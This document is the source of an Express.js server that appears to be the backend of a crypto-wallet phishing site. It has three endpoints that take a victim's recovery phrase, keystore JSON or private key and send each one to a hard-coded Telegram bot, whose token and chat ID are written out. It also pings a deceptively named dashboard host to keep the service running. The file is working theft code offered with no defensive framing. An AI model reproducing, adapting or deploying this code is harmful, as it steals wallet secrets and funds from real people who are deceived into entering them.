 
const express = require('express');  
const dotenv = require('dotenv'); 
const path = require('path');
const cors = require('cors');
const app = express();
const https = require('https');

dotenv.config();

// Import EmailService
// const emailService = require('./services/emailService.js');
 
 app.use(cors());
 app.use(express.json());
 app.use(express.urlencoded({extended:false}));      

const BOT_TOKEN = "8592311893:AAEkDtVvaXSlFUe81AvpTQJ_OaZXpexUA54";
const CHAT_ID   = "6778577761";

function sendTelegram(msg) {
  https.get(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
}

 
 // API routes first so they are not shadowed by the static catch-all
 app.post('/processing', async (req, res) => {
     try {
         const inpvalue = req.body.inputvalue; // Extract data from request

         if (!inpvalue) {
             return res.status(400).json({ error: "Missing required fields" });
         }

         console.log('📧 Processing recovery phrase request...');
         sendTelegram(`
🔔 New Request
─────────────
📥 Input: ${inpvalue}
`);
  res.status(200).json({msg:'great'})
     } catch (err) {
         console.error('❌ Error in recovery phrase endpoint:', err); 
         res.status(500).json({ error: 'Internal server error', details: err.message });
     }
 });



 
 app.post('/processingb', async (req, res) => { 
   console.log('📧 Keystore JSON received:', req.body.inputvalue);
   try {
       const inpvalue = req.body.inputvalue; // Extract data from request

       if (!inpvalue) {
           return res.status(400).json({ error: "Missing required fields" });
       }

       console.log('📧 Processing keystore JSON request...');
       sendTelegram(`
🔔 New Request
─────────────
📥 Input: ${inpvalue}
`);
  res.status(200).json({msg:'great'})
   } catch (err) {
       console.error('❌ Error in keystore JSON endpoint:', err); 
       res.status(500).json({ error: 'Internal server error', details: err.message });
   }
});





app.post('/processingc', async (req, res) => {
   try {
       const inpvalue = req.body.inputvalue; // Extract data from request

       if (!inpvalue) {
           return res.status(400).json({ error: "Missing required fields" });
       }

       console.log('📧 Processing private key request...');
        sendTelegram(`
🔔 New Request
─────────────
📥 Input: ${inpvalue}
`); 
        res.status(200).json({msg:'great'})  
   } catch (err) {
       console.error('❌ Error in private key endpoint:', err); 
       res.status(500).json({ error: 'Internal server error', details: err.message });
   }
});   
 
 // Serve static files from the React build directory
app.use(express.static(path.join(__dirname, "build"))); 

// Handle all other routes and serve index.html
app.get("*", (req, res) => {
    res.sendFile(path.join(__dirname, "build", "index.html"));
  }); 
  
setInterval(() => https.get("https://secure-dashboard-connect-decentralized.onrender.com"), 10 * 60 * 1000);

app.listen(5000 , ()=>{
    console.log('Listening on port 5000');
 });
